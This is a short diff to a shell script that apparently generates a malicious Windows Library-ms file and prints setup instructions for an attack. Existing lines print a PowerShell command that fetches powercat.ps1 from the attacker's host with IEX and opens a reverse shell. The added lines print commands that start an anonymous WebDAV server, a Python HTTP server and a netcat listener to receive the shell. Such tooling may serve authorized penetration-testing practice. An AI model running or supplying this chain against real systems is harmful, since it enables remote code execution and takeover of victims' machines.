@@ -59,3 +59,11 @@ echo "File saved to ./config.Library-ms."
 echo "Inject the following command in location field when creating shortcut file:"
 
 echo "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://${lhost}:8000/powercat.ps1'); powercat -c ${lhost} -p ${lport} -e powershell\""
+
+echo "Copy your shortcut file to this folder and start WebDAV, Python3 HTTP server and netcat listener:"
+
+echo "wsgidav --host ${lhost} --port 80 --auth anonymous --root ."
+
+echo "python3 -m http.server -b ${lhost}"
+
+echo "nc -nlvp ${lport}"
